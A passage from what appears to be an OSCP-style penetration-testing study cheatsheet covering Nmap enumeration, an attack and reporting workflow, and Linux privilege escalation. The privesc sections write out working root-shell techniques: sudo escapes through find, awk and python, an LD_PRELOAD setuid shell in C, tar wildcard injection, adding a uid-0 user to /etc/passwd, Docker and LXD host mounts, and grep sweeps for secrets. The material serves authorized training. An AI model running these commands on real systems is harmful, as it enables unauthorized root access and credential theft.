SYN and UDP probes do not become proxy-compatible. Record the 100-port limit. <h3

title: 10.4.2.9 Identify applications on discovered TCP ports
text: id="identify-applications-on-discovered-tcp-ports">10.4.2.9 Identify applications on discovered TCP ports nmap -sT -n -sV -p PORTS -oA scans/tcp-services TARGET nmap -sT -n -sV -sC -p PORTS -oA scans/tcp-services-default TARGET Use the first for application probes; add default scripts only when their interactions answer a useful question. A version match is an exploit candidate, not proof. <h3

title: 10.4.2.10 Inspect and run one named NSE script
text: id="inspect-and-run-one-named-nse-script">10.4.2.10 Inspect and run one named NSE script nmap --script-help http-headers nmap -sT -n -p PORTS --script http-headers -oA scans/http-headers TARGET Decisive output: behavior or metadata relevant to the chosen question. Read script help before use. The example performs an HTTP HEAD request for / . <h3

title: 10.4.2.11 UDP common sample, focused detail and full coverage
text: id="udp-common-sample-focused-detail-and-full-coverage">10.4.2.11 UDP common sample, focused detail and full coverage sudo nmap -sU -n --top-ports 20 -oA scans/udp-top20 TARGET sudo nmap -sU -n --top-ports 100 -oA scans/udp-top100 TARGET sudo nmap -sU -n -sV -p PORTS -oA scans/udp-detail TARGET sudo nmap -sU -n -p- --stats-every 60s -oA scans/udp-all TARGET Choose a bounded sample first, a protocol-aware focused probe when a candidate matters, and full UDP only when the objective/time justifies it. Silence can remain open|filtered ; full coverage can be slow. <h3

title: 10.4.2.12 Verify one TCP endpoint
text: id="verify-one-tcp-endpoint">10.4.2.12 Verify one TCP endpoint nc -nv -w 3 -z TARGET PORTS sudo nmap -sS -n -v --reason -p PORTS -oN scans/tcp-check.txt TARGET Use one port for the Netcat check. Success confirms connection acceptance; refusal is explicit rejection; timeout is unresolved. --reason shows what drove Nmap's classification. <h3

title: 10.4.2.13 Windows source position
text: id="windows-source-position">10.4.2.13 Windows source position Test-NetConnection -ComputerName TARGET -Port PORTS 22,80,443,445,3389 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("TARGET", $_)) "TCP port $_ is open"} 2>$null Use one port with Test-NetConnection . The loop prints successful ordinary TCP connections and hides errors; no line does not classify a port as closed. Results belong to the Windows host's route and filtering context. <h2

title: 10.4.3 State decisions
text: id="state-decisions">10.4.3 State decisions State What it establishes Next action open An endpoint accepted the selected connection/probe from this source Identify and enumerate the application closed Explicit rejection in this context Move on unless target/source state later changes filtered Filtering, loss or path behavior prevented a decision Diagnose only when the endpoint matters unfiltered Reachable by the chosen probe; open versus closed unresolved Use a scan type that answers that distinction `open filtered` Either listening silently or filtered `closed filtered` Either rejected or filtered A port-number service label is a clue. -sV , protocol behavior and configuration evidence raise confidence. None of them alone proves exploitability. <h2

title: 10.4.4 Prioritization
text: id="prioritization">10.4.4 Prioritization Prefer the cheapest test likely to produce one of these: direct anonymous or supplied-credential access; exposed files, configuration, backups or useful metadata; a clear application/product/configuration prerequisite for a public exploit; credentials, names, shares or routes that expand another surface; a decisive disproof that lets you leave a path. Investigate applications, not port stereotypes. Keep an explicit return item for incomplete full TCP, UDP or application coverage. <h2

title: 10.4.5 Rescan triggers
text: id="rescan-triggers">10.4.5 Rescan triggers New route, source host or tunnel: repeat the relevant network checks from that position. Target restart or changed assignment: confirm the IP and refresh affected results. New credential or identity: re-enumerate authentication -dependent service behavior; a complete port rescan is not automatically necessary. Foothold: inspect local and internally bound listeners, then map how to reach them. Higher privilege: re-enumerate protected configuration, credentials, services and routes. Lossy or inconsistent evidence: repeat only the decisive focused test with the same tuple and clearer diagnostics. Do not repeat an unchanged disproven scan merely because an exploit failed. <h2

title: 10.4.6 Failure repair
text: id="failure-repair">10.4.6 Failure repair Symptom Check Every host appears down Portal/target state, current IP, interface and route; then one assigned known endpoint SYN scan lacks privileges Use sudo or switch to -sT Discovery omits a known-running target Focused -Pn scan and actual response reasons Only filtered results Route/source, loss and one known/relevant endpoint Kali and Windows disagree Hold target, transport, port and time constant before blaming source filtering Scan is slow UDP silence, service probes, retries, loss and selected coverage; use progress output Few results Confirm default/common versus selected/range/full port coverage tcpwrapped or early close Treat as an early-close observation, not a product or vulnerability; probe further only if identity matters <h2

title: 10.4.7 Evidence minimum
text: id="evidence-minimum">10.4.7 Evidence minimum Save commands and output with different prefixes. Record source, target, transport, selected ports, discovery mode, scan type, time, state, application confidence, uncertainty and the next action. -oA PREFIX writes normal, grepable and XML output; keep the readable .nmap and the raw formats. Sources: supplied PEN-200 2025 edition, sections 6.4.2-6.4.3, pp142-156; Nmap port states , scan techniques , version detection , NSE usage , timing , and output . Supplemental source: Hexdump live enumeration cheatsheet . <h2

title: 10.4.8 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.4.8 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.4.8.1 Discover attack surfaces
text: id="discover-attack-surfaces">10.4.8.1 Discover attack surfaces <summary

title: 10.4.8.1.1 Find: Validate the source path and discover hosts
text: id="variant-10-4-8-1-1">10.4.8.1.1 Find: Validate the source path and discover hosts From the assessment host inspect the assigned interface and the route to the exact target before interpreting silence. ip addr ip route get TARGET nmap -sn SUBNET -oA host-discovery Recognize: The route names the intended interface/source; a responder is evidence from that source, not a global reachability claim. Validate next: Check scope, target state and whether host-discovery probes are permitted by this path. Validate the source path and discover hosts . <summary

title: 10.4.8.1.2 Find: Discover TCP ports with SYN or connect scans
text: id="variant-10-4-8-1-2">10.4.8.1.2 Find: Discover TCP ports with SYN or connect scans After path validation, compare a first TCP pass with explicit full-port coverage; record skipped discovery or privilege limitations. nmap -Pn -sT --top-ports 1000 TARGET -oA tcp-initial nmap -Pn -sT -p- TARGET -oA tcp-full Recognize: The high listener exists outside the first selection; its application label remains provisional. Validate next: Confirm scan completion, source, errors and application behavior on each interesting port. Discover TCP ports with SYN or connect scans . <summary

title: 10.4.8.1.3 Find: Identify applications and validate selected NSE checks
text: id="variant-10-4-8-1-3">10.4.8.1.3 Find: Identify applications and validate selected NSE checks Take the discovered open-port list and request protocol/version evidence rather than choosing attacks from conventional port numbers. nmap -Pn -sV -p PORTS TARGET -oA selected-services Recognize: An HTTP response on a nonstandard port routes investigation to application mapping; a product string is still only fingerprint evidence. Validate next: Verify normal requests, hostname/TLS requirements and exact build/configuration before selecting an exploit. Identify applications and validate selected NSE checks . <summary

title: 10.4.8.1.4 Find: Probe UDP and resolve ambiguous silence
text: id="variant-10-4-8-1-4">10.4.8.1.4 Find: Probe UDP and resolve ambiguous silence Inspect discovery results and DNS/SNMP/RPC clues, then probe a separate bounded UDP selection from the same source. sudo nmap -Pn -sU --top-ports 20 --reason TARGET -oA udp-initial Recognize: A DNS response confirms a UDP application; open|filtered SNMP silence is a candidate requiring a correctly formatted request. Validate next: Check accepted service parameters, response identity and possible ICMP rate limiting. Probe UDP and resolve ambiguous silence . <summary

title: 10.4.8.1.5 Find: Validate uncertain results and rebuild the service queue
text: id="variant-10-4-8-1-5">10.4.8.1.5 Find: Validate uncertain results and rebuild the service queue Compare saved scan results with one direct connection and a service-native request for the endpoint that changes your next decision. nc -nvz TARGET PORT nmap -Pn -sT -p PORT --reason TARGET Recognize: Independent TCP reachability supports an endpoint candidate, not credentials, read permission or execution. Validate next: Identify the application and validate the particular next-layer action. Validate uncertain results and rebuild the service queue . <summary

title: 10.4.8.1.6 Find: Enumerate reachable endpoints from a Windows source
text: id="variant-10-4-8-1-6">10.4.8.1.6 Find: Enumerate reachable endpoints from a Windows source From the Windows foothold inspect interfaces/routes, then check an assigned internal host's selected service ports. Get-NetIPConfiguration Get-NetRoute -AddressFamily IPv4 Test-NetConnection TARGET -Port 445 Recognize: The service is reachable from this Windows source; this can reveal a useful vantage point unavailable from Kali. Validate next: Confirm application/authentication and whether a forward or a native client can use that route. Enumerate reachable endpoints from a Windows source . <summary

title: 10.4.8.1.7 Find: Discriminate unknown listeners and use scanner alternatives
text: id="variant-10-4-8-1-7">10.4.8.1.7 Find: Discriminate unknown listeners and use scanner alternatives Select an unexplained listener from the saved queue, compare native connection behavior, then use focused version/TLS probes. nmap -Pn -sV --version-all -p PORT TARGET nc -nv TARGET PORT Recognize: TLS and an HTTP redirect suggest a hostname-selected web application rather than an attack tied to the port number. Validate next: Reproduce the hostname/TLS request and confirm exact software/configuration. Discriminate unknown listeners and use scanner alternatives .

title: 10.5 Integrated Attack and Reporting Cheatsheet
text: id="integrated-attack-and-reporting-cheatsheet">10.5 Integrated Attack and Reporting Cheatsheet ← Cheatsheet index | Full procedure | Strategy map | Study methods: Complete attacks and retain reproducible evidence <h2

title: 10.5.1 State map
text: id="state-map">10.5.1 State map HOSTS: host/IP | role | reachable from | services | evidence IDENTITIES: local/domain | credential type | validated access | privilege | source ROUTES: source -> tunnel/pivot -> destination | DNS | callback path HYPOTHESES: observation | prerequisite | test | status TRANSITIONS: old state -> action -> new state | decisive evidence EVIDENCE: objective | reproduction | identity/IP proof | screenshot | submission/task state <h2

title: 10.5.2 Core attack loop
text: id="core-attack-loop">10.5.2 Core attack loop Observe → Enumerate → Interpret → Hypothesize → Validate prerequisite → Exploit → Verify new state → Re-enumerate → Escalate/Move → Document Keep two queues: COVERAGE: source position → host → endpoint → application → enumeration state HYPOTHESIS: observation → desired transition → prerequisite → next test → status <h2

title: 10.5.3 State-change router
text: id="state-change-router">10.5.3 State-change router New evidence/state Re-enter Host/address/interface/listener/route Discovery and service identification from the reachable source Credential/key/hash/ticket Classification, compatible validation and authenticated enumeration Application role/session Application mapping through the new authorization view Execution/shell Host/identity/network verification, session repair and local enumeration Root/Administrator/SYSTEM Protected credentials, services, sessions, routes and domain context Domain identity/group/right AD objects/rights plus reachable host/service paths Pivot/proxy Discovery from new vantage; separate delivery/callback route design <h2

title: 10.5.4 Candidate card and priority
text: id="candidate-card-and-priority">10.5.4 Candidate card and priority Observation: Desired transition: Prerequisites: Confirmed / unknown: Cheapest discriminating test: Success / failure meaning: Noise, cleanup and handoff: Status / evidence: Priority: confirmed prerequisite/direct transition → one cheap missing prerequisite → information-expanding path → multi-assumption/disruptive path → disproven path closed until new evidence. <h2

title: 10.5.5 Standalone sequence
text: id="standalone-sequence">10.5.5 Standalone sequence scope/objective → TCP + bounded UDP coverage → service/web enumeration → files/config/identity opportunities → credential, manual weakness or exact exploit prerequisite → bounded effect → verified session → initial-access evidence → local enumeration → controlled object + privileged consumer + trigger → verified elevated identity → final evidence + cleanup + reproduction path <h2

title: 10.5.6 Assumed-breach AD sequence
text: id="assumed-breach-ad-sequence">10.5.6 Assumed-breach AD sequence starting credential → identity + DNS/time/DC + route → hosts/services + directory objects/rights → ranked identity/host transition → compatible password/hash/ticket use → verified session/new identity → authenticated re-enumeration → route/lateral movement → final domain objective and evidence For every edge keep identity → effective group/right → target → protocol/route → resulting state together. <h2

title: 10.5.7 Save output
text: id="save-output">10.5.7 Save output mkdir -p evidence/nmap evidence/web evidence/loot evidence/screenshots nmap -Pn -sV -sC -p PORTS TARGET -oA evidence/nmap/TARGET-services script -q -f evidence/session.txt sha256sum FILE | tee FILE.sha256 Run exit to close/flush the script transcript. Start-Transcript -Path .\evidence\powershell-session.txt # commands Stop-Transcript <h2

title: 10.5.8 Verify state
text: id="verify-state">10.5.8 Verify state date -Is; hostname; id; ip addr; ip route echo %DATE% %TIME% hostname whoami /all ipconfig /all route print <h2

title: 10.5.9 Transition record
text: id="transition-record">10.5.9 Transition record observation -> prerequisite -> exact action -> decisive output -> host/identity -> new capability -> cleanup -> re-enumeration <h2

title: 10.5.10 Dead-end recovery
text: id="dead-end-recovery">10.5.10 Dead-end recovery freeze current state → mark last decisive result per path → check coverage and authenticated views → separate tool/environment failure from attack evidence → choose one test that can change the decision → switch to the strongest supported branch → return only when new evidence changes a prerequisite Result Label/action Test did not exercise prerequisite Inconclusive ; redesign test Exact prerequisite absent Disproven; close path Authentication succeeds, action denied Authorization boundary; enumerate rights New identity/route, old results reused Stale state; re-enumerate No decisive candidates Coverage gap; return to enumeration <h2

title: 10.5.11 Exploit modifications
text: id="exploit-modifications">10.5.11 Exploit modifications git diff --no-index original.py modified.py > exploit-changes.diff sha256sum original.py modified.py Record original URL/commit, changed lines, why, build/payload command, execution and result. <h2

title: 10.5.12 Before final export
text: id="before-final-export">10.5.12 Before final export Evidence appears next to each claim. Target sections follow the control-panel/grading order. Proof is read with cat / type from its original location in an interactive target shell. Each proof screenshot includes the target IP; the control-panel submission is tracked separately before practical time ends. Screenshots show required host/identity/IP/objective context. Steps are ordered and reproducible. Required scripts/PoCs are included as text inside the PDF, not as extra archive members. Secrets are absent from public notes. PDF is visually checked after export. Archive/upload naming, size and hash follow the current official guide. No AI is used on actual exam targets, proofs or reporting. <h2

title: 10.5.13 Package rehearsal
text: id="package-rehearsal">10.5.13 Package rehearsal 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf 7z l OSCP-OS-XXXXX-Exam-Report.7z 7z t OSCP-OS-XXXXX-Exam-Report.7z md5sum OSCP-OS-XXXXX-Exam-Report.7z Get-FileHash -Algorithm MD5 -LiteralPath '.\OSCP-OS-XXXXX-Exam-Report.7z' Current baseline: exact case-sensitive names, one PDF in a non-password-protected .7z , no larger than 200 MB. Visually inspect every PDF page, compare local/upload MD5, complete the final submission action and retain acknowledgement. Recheck the official guide immediately before use. Use the official Word/LibreOffice template unless a Markdown/Pandoc pipeline has already passed a complete dummy export and archive rehearsal. <h2

title: 10.5.14 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.5.14 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.5.14.1 Complete attacks and retain reproducible evidence
text: id="complete-attacks-and-retain-reproducible-evidence">10.5.14.1 Complete attacks and retain reproducible evidence <summary

title: 10.5.14.1.1 Find: Maintain state and select the next evidence-producing test
text: id="variant-10-5-14-1-1">10.5.14.1.1 Find: Maintain state and select the next evidence-producing test Inspect the current private host/identity/route notes and compare each proposed action with a named unresolved question. For each candidate record: HOST | IDENTITY | ROUTE | OBSERVED CAPABILITY | MISSING CONDITION | NEXT DISCRIMINATING TEST Recognize: The ledger distinguishes an unvalidated hypothesis from an enabled candidate and a missing coverage question. Validate next: Verify the next test resolves a stated uncertainty and its expected outcomes change the decision. Maintain state and select the next evidence-producing test . <summary

title: 10.5.14.1.2 Find: Integrate a standalone or assumed-breach AD attack
text: id="variant-10-5-14-1-2">10.5.14.1.2 Find: Integrate a standalone or assumed-breach AD attack Take the current verified capability and compare it with the receiving method's starting access and missing conditions. CURRENT RESULT -> CANDIDATE NEXT METHOD -> REQUIRED INPUT -> MISSING PROOF Recognize: A file read does not itself create a shell; the chain needs an actual credential/identity transition. Validate next: Verify every produced material type, account, route and service-specific right before connecting the next step. Integrate a standalone or assumed-breach AD attack . <summary

title: 10.5.14.1.3 Find: Recover from dead ends without repeating disproven paths
text: id="variant-10-5-14-1-3">10.5.14.1.3 Find: Recover from dead ends without repeating disproven paths Compare recent attempts with the last saved working state and classify the first newly introduced boundary. LAST VERIFIED STATE | FIRST NEW FAILURE | EXACT ERROR | CHANGED CONDITION | NEXT CONTROL Recognize: Repeated payload changes are not testing the first missing transfer/route condition. Validate next: Reproduce the last proof and isolate one new condition at a time; preserve rejected paths and return conditions. Recover from dead ends without repeating disproven paths . <summary

title: 10.5.14.1.4 Find: Capture state-transition, proof and exploit-adaptation evidence
text: id="variant-10-5-14-1-4">10.5.14.1.4 Find: Capture state-transition, proof and exploit-adaptation evidence At every observed access/identity/privilege change inspect whether saved output ties the effect to the correct host, token and command/request. hostname id ip addr Recognize: A success screenshot or identity line can be real while the reproduction path is incomplete. Validate next: Capture the exact source/destination, method, material context, transition, relevant proof and adaptation steps privately. Capture state-transition, proof and exploit-adaptation evidence . <summary

title: 10.5.14.1.5 Find: Build and validate the report and submission artifacts
text: id="variant-10-5-14-1-5">10.5.14.1.5 Find: Build and validate the report and submission artifacts Inspect the report rendered from retained transitions and the actual archive contents; export success is only one part of readiness. pdfinfo REPORT.pdf 7z l REPORT.7z md5sum REPORT.7z Recognize: The container is valid while a reproduction instruction is unreadable; inspect rendered content as well as file structure. Validate next: Verify complete reproduction, legible pages, current required names/content and upload/local checksum when applicable. Build and validate the report and submission artifacts .

title: 10.6 Linux Privilege Escalation Cheatsheet
text: id="linux-privilege-escalation-cheatsheet">10.6 Linux Privilege Escalation Cheatsheet ← Cheatsheet index | Full procedure | Master Notes | Strategy map | Study methods: Escalate privileges on Linux <h2

title: 10.6.1 Early tool-assisted pass
text: id="early-tool-assisted-pass">10.6.1 Early tool-assisted pass Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity. id uname -m sh ./linpeas.sh | tee linpeas.txt Tool-to-finding workflow . <h2

title: 10.6.2 Candidate proof
text: id="candidate-proof">10.6.2 Candidate proof controlled object → effective permission → privileged consumer → execution identity → trigger → effect → verified identity Do not exploit an automated highlight until every link is supported. Prioritize credentials/sudo, writable root consumers and SUID/capabilities before software/kernel exploits. <h2

title: 10.6.3 First pass
text: id="first-pass">10.6.3 First pass hostname; id; groups uname -a; cat /etc/os-release; getconf LONG_BIT pwd; umask; env ip addr; ip route; ss -lntup; ss -lxnp ps auxf mount; findmnt; lsblk; df -hT sudo -n -l 2>&1 sudo -l getent passwd awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd <h2

title: 10.6.4 Prove effective permissions
text: id="prove-effective-permissions">10.6.4 Prove effective permissions namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS find / -xdev -type f -writable -ls 2>/dev/null find / -xdev -type d -writable -ls 2>/dev/null Parent write+execute may permit replacement. ACLs can override the mode-bit impression. nosuid blocks SUID/SGID/file capabilities; noexec blocks direct execution; ro blocks changes. <h2

title: 10.6.5 Credentials and files
text: id="credentials-and-files">10.6.5 Credentials and files history 2>/dev/null find /home /root -maxdepth 3 -type f \ \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \ -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \ -readable 2>/dev/null grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \ /var/www /opt /srv /etc 2>/dev/null | head -n 200 ps auxww ps eww -u root 2>/dev/null tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo tr '\0' '\n' < /proc/PID/environ 2>/dev/null w; who; last -n 20 env | grep -E 'SSH_AUTH_SOCK|TMUX|STY' tmux ls 2>/dev/null screen -ls 2>/dev/null find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null Record user/service context before su , sudo , SSH or application validation. /proc access and short process lifetime can hide values. Session/agent sockets require effective access and a useful live identity. <h2

title: 10.6.6 Sudo
text: id="sudo">10.6.6 Sudo sudo -n -l 2>&1 sudo -l sudo --version Check: run-as user/group, exact path, arguments/wildcards, password tag, SETENV , env_keep , secure_path , NOEXEC . sudo /usr/bin/find . -exec /bin/sh \; -quit sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}' sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' Match exact rule and mode in GTFOBins . A binary name alone is insufficient. <summary

title: 10.6.6.1 LD_PRELOAD only when allowed/preserved
text: id="variant-10-6-6-1">10.6.6.1 LD_PRELOAD only when allowed/preserved sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD' #include <stdlib.h> #include <unistd.h> void _init(void) { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); } gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM <h2

title: 10.6.7 SUID / SGID / capabilities
text: id="suid--sgid--capabilities">10.6.7 SUID / SGID / capabilities find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null getcap -r / 2>/dev/null namei -l /PATH/TO/BINARY stat /PATH/TO/BINARY file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' strings /PATH/TO/BINARY | head -n 150 dpkg -S /PATH/TO/BINARY 2>/dev/null rpm -qf /PATH/TO/BINARY 2>/dev/null Capability triage: High priority: cap_setuid, cap_setgid, cap_dac_override, cap_dac_read_search, cap_sys_ptrace, cap_sys_admin, cap_setfcap, cap_sys_module Contextual: cap_net_raw and narrow service capabilities capsh --print 2>/dev/null grep '^Cap' /proc/self/status /PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' Last command requires effective cap_setuid on that exact interpreter. Check bounding set, namespace, mount and privilege retention. <h2

title: 10.6.8 Cron, timers, services and short-lived processes
text: id="cron-timers-services-and-short-lived-processes">10.6.8 Cron, timers, services and short-lived processes crontab -l 2>/dev/null cat /etc/crontab cat /etc/anacrontab 2>/dev/null atq 2>/dev/null ls -la /etc/cron.* /var/spool/cron 2>/dev/null grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100 systemctl list-timers --all systemctl list-unit-files --type=service systemctl list-units --type=service --state=running systemctl cat UNIT systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles ./pspy64 ./pspy64 -pf -i 1000 namei -l /PATH/TO/SCRIPT stat /PATH/TO/SCRIPT /PATH/TO/PARENT getfacl -p /PATH/TO/SCRIPT /PATH/TO/PARENT 2>/dev/null Need controllable referenced object + higher run identity + schedule/restart trigger. Cron environment differs from the interactive shell; writable service config still needs reload/restart. Use the same chain for backup, logrotate, package-maintenance and custom housekeeping hooks. <h2

title: 10.6.9 PATH hijacking
text:
id="path-hijacking">10.6.9 PATH hijacking echo "$PATH" | tr ':' '
' echo "$PATH" | tr ':' '
' | while IFS= read -r d; do [ -z "$d" ] && d=. [ -w "$d" ] && ls -ld "$d" done strings /PATH/TO/PRIVILEGED_BINARY | grep -E '(^|[^/])(cp|tar|service|sh|bash|cat)( |$)' printf '#!/bin/sh
/usr/bin/id > /tmp/path-proof
' > /WRITABLE/DIR/helper chmod 700 /WRITABLE/DIR/helper PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER cat /tmp/path-proof Need relative command + consumer's effective PATH + earlier writable directory + privileged trigger. <h2

title: 10.6.10 Wildcard option injection
text: id="wildcard-option-injection">10.6.10 Wildcard option injection grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \ /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null GNU tar, only in the privileged job's writable working directory: printf '#!/bin/sh\n/usr/bin/id > /tmp/wildcard-proof\n' > proof.sh chmod 700 proof.sh touch -- '--checkpoint=1' touch -- '--checkpoint-action=exec=sh proof.sh' Confirm expansion, option support/order, utility implementation, identity and trigger. <h2

title: 10.6.11 Writable account and policy files
text: id="writable-account-and-policy-files">10.6.11 Writable account and policy files ls -l /etc/passwd /etc/shadow /etc/sudoers namei -l /etc/passwd getfacl -p /etc/passwd 2>/dev/null <summary

title: 10.6.11.1 Writable /etc/passwd — disposable authorized lab
text: id="variant-10-6-11-1">10.6.11.1 Writable /etc/passwd — disposable authorized lab cp /etc/passwd /tmp/passwd.backup HASH=$(openssl passwd -6 'TEMP_PASSWORD') printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd su - root2 id Preserve/restore the original. Avoid direct change without a recovery path. <h2

title: 10.6.12 Groups, sockets and containers
text: id="groups-sockets-and-containers">10.6.12 Groups, sockets and containers id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh Docker/LXD need actual daemon rights and suitable configuration/image. Also investigate disk , shadow , adm , systemd-journal and libvirt by the resource they expose. <h2

title: 10.6.13 Mounts, NFS, local services and libraries
text: id="mounts-nfs-local-services-and-libraries">10.6.13 Mounts, NFS, local services and libraries findmnt cat /etc/fstab mount ss -lntup ss -lxnp NFS privesc requires a writable no_root_squash export plus target execution from a mount where SUID is effective. Root-only listeners/sockets still need a controllable privileged action. file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null Library hijacking needs a privileged dynamic consumer and a writable selected search location/preserved variable. Prefer readelf when the executable is untrusted. grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT /PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))' For interpreter/module hijacking, prove the privileged script's actual import/include search order; an interactive search path may differ. <h2

title: 10.6.14 Software/kernel candidates — last
text: id="softwarekernel-candidates--last">10.6.14 Software/kernel candidates — last uname -a cat /proc/version cat /etc/os-release dpkg -l 2>/dev/null rpm -qa 2>/dev/null sudo --version lsmod sysctl kernel.unprivileged_userns_clone 2>/dev/null searchsploit "PRODUCT VERSION local privilege escalation" searchsploit -x EDB_ID searchsploit -m EDB_ID gcc -Wall -Wextra exploit.c -o exploit file exploit sha256sum exploit Match exact build/backports, architecture, configuration, namespace/capability, mitigations and dependencies. Review source and crash/recovery risk. <h2

title: 10.6.15 Automated candidate generation
text: id="automated-candidate-generation">10.6.15 Automated candidate generation ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt LinPEAS -a is slower/noisier and adds password attempts/process monitoring; use only when justified. LSE -l2 and unix-privesc-check detailed are later depth, not baseline. Transfer a trusted copy and record its hash instead of piping an unverified download to sh . <h2

title: 10.6.16 Failure quick map
text: id="failure-quick-map">10.6.16 Failure quick map Symptom Next check Sudo escape fails Exact args/run-as, NOEXEC , privilege drop, MAC logs SUID/capability stays low Owner/mode/exact path, nosuid , effective/bounding set, namespace Cron/service never fires Definition, run user, schedule/restart, PATH/shell/cwd, pspy/logs PATH/wildcard ignored Absolute path or reset PATH; expansion cwd/option parsing Docker denied Socket ACL, active group session, rootless/authz/userns controls Kernel PoC fails Exact affected build/config, arch, toolchain/dependencies Enumerator reports “possible” Manually prove object, consumer, identity and trigger <h2

title: 10.6.17 Verify and re-enumerate
text: id="verify-and-re-enumerate">10.6.17 Verify and re-enumerate id; whoami; groups hostname; pwd ip addr; ip route Re-enumerate protected files, credentials, services, listeners, mounts and routes after the identity change. <h2

title: 10.6.18 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.6.18 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.6.18.1 Escalate privileges on Linux
text: id="escalate-privileges-on-linux">10.6.18.1 Escalate privileges on Linux <summary

title: 10.6.18.1.1 Find: Establish Linux state and choose an escalation candidate
text: id="variant-10-6-18-1-1">10.6.18.1.1 Find: Establish Linux state and choose an escalation candidate At a new shell collect effective IDs/groups, current mounts, root-owned activity and exact sudo rules before choosing a technique. id findmnt ps auxww sudo -l Recognize: The sudo rule and privileged backup consumer open different candidate families; neither should be replaced by an automatic kernel choice. Validate next: For each candidate establish exact permitted operation/object, run-as identity and trigger. Establish Linux state and choose an escalation candidate . <summary

title: 10.6.18.1.2 Find: Prove effective file, directory, ACL and mount control
text: id="variant-10-6-18-1-2">10.6.18.1.2 Find: Prove effective file, directory, ACL and mount control From a real privileged script/binary/configuration path inspect every parent, ACL and effective mount before assuming control. namei -l /PATH/TO/OBJECT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT findmnt -T /PATH/TO/OBJECT Recognize: Parent replacement can provide a control primitive even when the existing file's write bit is absent. Validate next: Run namei -l, stat and getfacl on the exact path and its parents, then findmnt -T for ro/noexec/nosuid. Check the identity and trigger of the process that uses this path; write permission alone is not execution. Prove effective file, directory, ACL and mount control . <summary

title: 10.6.18.1.3 Find: Recover credentials from Linux user, service and process trails
text: id="variant-10-6-18-1-3">10.6.18.1.3 Find: Recover credentials from Linux user, service and process trails Follow observed application processes and directories into readable configuration, history and environment; prioritize paths tied to actual services. ps auxww history find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null Recognize: An actual service's readable configuration supplies an identity-labelled secret candidate. Validate next: Read the named config/history/process artifact and record the user, service and host it belongs to. Classify a recovered password/key, test one matching service context and verify the accepted identity before trying reuse elsewhere. Recover credentials from Linux user, service and process trails . <summary

title: 10.6.18.1.4 Find: Use an allowed sudo operation to cross a privilege boundary
text: id="variant-10-6-18-1-4">10.6.18.1.4 Find: Use an allowed sudo operation to cross a privilege boundary Run the exact sudo policy query from the current user and read run-as identity, executable, arguments and tags. sudo -n -l 2>&1 sudo -l Recognize: The rule permits that exact program as root; its documented privileged operation becomes a candidate. Validate next: Read sudo -l: match the run-as user, exact executable and allowed arguments. Check NOPASSWD/password access and NOEXEC/environment restrictions; choose only the GTFOBins operation that the full rule permits, then verify id. Use an allowed sudo operation to cross a privilege boundary . <summary

title: 10.6.18.1.5 Find: Load a controlled library through a permitted sudo environment
